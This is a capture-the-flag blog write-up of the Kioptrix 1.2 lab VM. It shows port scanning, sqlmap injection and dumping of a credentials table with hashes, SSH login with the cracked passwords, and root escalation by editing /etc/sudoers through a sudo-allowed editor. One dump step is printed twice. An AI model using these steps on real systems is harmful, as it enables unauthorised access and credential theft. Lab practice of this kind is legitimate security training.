---
layout: post
title: "Kioptrix hacking challenge: Part 3"
date: 2012-07-16 18:10:26 -0400
comments: true
categories: boot2root
alias: /2012/07/kioptrix-hacking-challenge-part-3.html
---

The third Kioptrix challenge is level 1.2, which can be downloaded from [http://www.kioptrix.com/blog/?page_id=135](http://www.kioptrix.com/blog/?page_id=135). This challenge is definitely a bit more involved than the first two. When the Kioptrix VM starts up, it informs us that /etc/hosts file should be modified to map the Kioptrix IP address to kioptrix3.com

<!--more-->

![](/images/2012-07-16/01.png)

On my Backtrack VM, I used netdiscover to identify the IP address of the Kioptrix VM as 192.168.1.149. I added this IP address to /etc/hosts and mapped it to kioptrix3.com

```
192.168.1.149   kioptrix3.com 
```

That completes the setup and pointing the browser to http://kioptrix3.com shows the Ligoat Security website:

![](/images/2012-07-16/02.png)

I begin by running a full port scan on the server using onetwopunch.sh. This covers all 65,535 TCP and UDP ports:

```
# onetwopunch.sh target.txt all
[+] scanning 192.168.1.149 for all ports...
[+] obtaining all open TCP ports using unicornscan...
[+] unicornscan -msf 192.168.1.149:a -l udir/192.168.1.149-tcp.txt
[+] ports for nmap to scan: 22,80,
[+] nmap -sV -oX ndir/192.168.1.149-tcp.xml -oG ndir/192.168.1.149-tcp.grep -p 22,80, 192.168.1.149
 
Starting Nmap 6.00 ( http://nmap.org ) at 2012-07-15 22:54 EDT
Nmap scan report for kioptrix3.com (192.168.1.149)
Host is up (0.00061s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
MAC Address: 00:0C:29:81:44:FF (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:kernel:2.6
OS details: Linux 2.6.9 - 2.6.31
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel
 
OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
[+] obtaining all open UDP ports using unicornscan...
[+] unicornscan -mU 192.168.1.149:a -l udir/192.168.1.149-udp.txt
[!] no UDP ports found
[+] scans completed
```

Only two ports discovered, http and ssh. I decided to start exploring the website. Clicking on the Login tab sends us to a login form that appears to be running LotucCMS. A quick check on Google reveals that this may be vulnerable to a remote code execution exploit: [http://www.exploit-db.com/exploits/15964/](http://www.exploit-db.com/exploits/15964/)

The website also promotes their new gallery, so I started poking around in it. Clicking on the Ligoat Press Room displays a page that has a form at the bottom, which allows us to sort the images:

![](/images/2012-07-16/03.png)

Playing around with this form causes the URL to change around a bit:

```
http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos
```

Suspecting that the id parameter might be injectable, I decide to try a SQL injection attack using sqlmap. Assuming that the backend database is running MySQL:

```
# ./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL
.
.
.
.
[22:53:35] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 10 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
```

My assumption paid off, the id parameter is injectable. I can re-run sqlmap with more specific probes now. I start off by identifying the databases:

```
# ./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL --dbs
.
.
.
[22:55:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL 5.0
[22:55:39] [INFO] fetching database names
[22:55:39] [INFO] the SQL query used returns 3 entries
[22:55:39] [INFO] retrieved: "information_schema"
[22:55:39] [INFO] retrieved: "gallery"
[22:55:39] [INFO] retrieved: "mysql"
available databases [3]:                                                       
[*] gallery
[*] information_schema
[*] mysql
```

There is a database called gallery. I check to see what tables are available:

```
# ./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL -D gallery --tables
.
.
.
 
[22:57:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL 5.0
[22:57:14] [INFO] fetching tables for database: gallery
[22:57:14] [INFO] the SQL query used returns 7 entries
[22:57:14] [INFO] retrieved: "dev_accounts"
[22:57:14] [INFO] retrieved: "gallarific_comments"
[22:57:14] [INFO] retrieved: "gallarific_galleries"
[22:57:14] [INFO] retrieved: "gallarific_photos"
[22:57:14] [INFO] retrieved: "gallarific_settings"
[22:57:14] [INFO] retrieved: "gallarific_stats"
[22:57:14] [INFO] retrieved: "gallarific_users"
Database: gallery                                                              
[7 tables]
+----------------------+
| dev_accounts         |
| gallarific_comments  |
| gallarific_galleries |
| gallarific_photos    |
| gallarific_settings  |
| gallarific_stats     |
| gallarific_users     |
+----------------------+
```

A table dev_accounts was found. Maybe it contains user names and passwords. I run sqlmap again to dump the contents of that table:

```
# ./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL -D gallery -T dev_accounts --dump
.
.
.
[22:58:34] [INFO] the SQL query used returns 2 entries
[22:58:34] [INFO] retrieved: "1","0d3eccfb887aabd50f243b3f155c0f85","dreg"
[22:58:34] [INFO] retrieved: "2","5badcaf789d3d1d09794d8f021f40f0e","loneferret"
[22:58:34] [INFO] analyzing table dump for possible password hashes            
recognized possible password hashes in column 'password'. Do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: gallery
Table: dev_accounts
[2 entries]
+----+----------------------------------+------------+
| id | password                         | username   |
+----+----------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e | loneferret |
+----+----------------------------------+------------+
```

A table dev_accounts was found. Maybe it contains user names and passwords. I run sqlmap again to dump the contents of that table:

```
# ./sqlmap.py -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=filename#photos" --dbms=MySQL -D gallery -T dev_accounts --dump
.
.
.
[22:58:34] [INFO] the SQL query used returns 2 entries
[22:58:34] [INFO] retrieved: "1","0d3eccfb887aabd50f243b3f155c0f85","dreg"
[22:58:34] [INFO] retrieved: "2","5badcaf789d3d1d09794d8f021f40f0e","loneferret"
[22:58:34] [INFO] analyzing table dump for possible password hashes            
recognized possible password hashes in column 'password'. Do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: gallery
Table: dev_accounts
[2 entries]
+----+----------------------------------+------------+
| id | password                         | username   |
+----+----------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e | loneferret |
+----+----------------------------------+------------+
```

Two accounts have been discovered with hashed passwords. I chose not to crack the hashes using sqlmap and used [http://www.md5decrypter.co.uk/](http://www.md5decrypter.co.uk/) instead. md5decrypter.co.uk is an excellent resource and I've used it numerous times to quickly crack various hashes.

![](/images/2012-07-16/04.png)

md5decrypter.co.uk successfully cracks both passwords. I decide to try to login to the server using SSH and the cracked credentials. The first attempt is done with loneferret's account:

```
# ssh loneferret@kioptrix3.com
The authenticity of host 'kioptrix3.com (192.168.1.149)' can't be established.
RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'kioptrix3.com,192.168.1.149' (RSA) to the list of known hosts.
loneferret@kioptrix3.com's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
 
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
 
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
 
To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Tue Mar 27 13:12:25 2012
loneferret@Kioptrix3:~$ 
```

The login attempt was successful and I now have a shell on the server. Looking at the contents of loneferret's home directory, I see a file called CompanyPolicy.README containing the following:

```
loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.
 
DG
CEO
loneferret@Kioptrix3:~$ 
```

I check to see what sudo privileges this user has:

```
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

It looks like I can only run /usr/local/bin/ht. Running this command launches the ht editor:

![](/images/2012-07-16/05.png)

Since the ht editor is running as root right now, I can easily open up any file readable only by root. I go to File > Open > /etc/sudoers (Mac users running this on VMware Fusion, it's Option+Command+F):

![](/images/2012-07-16/06.png)

I see the entry for loneferret and update it so loneferret can run the bash shell using sudo. This should give us our root shell:

```
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/bash
```

Save the file, quit the editor, and try running sudo /bin/bash:

```
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
    (root) NOPASSWD: /bin/bash
loneferret@Kioptrix3:~$ id
uid=1000(loneferret) gid=100(users) groups=100(users)
loneferret@Kioptrix3:~$ sudo /bin/bash
root@Kioptrix3:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Kioptrix3:~# 
```

Game over, I now have a root shell. Looking around the server, I find a /root/Congrats.txt with the following message:

```
root@Kioptrix3:/root# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.
.
.
.
```

There are definitely multiple ways to get into this system. Earlier on I found a vulnerability for LotusCMS that I chose not to exploit, and instead went with the SQL injection attack. I'll leave that attack vector for the reader to explore. This challenge requires a bit of knowledge on how sudo works in Linux. At times you may be lucky to find an admin who grants sudo access to programs that allow users to spawn a shell, or to modify critical system files. 

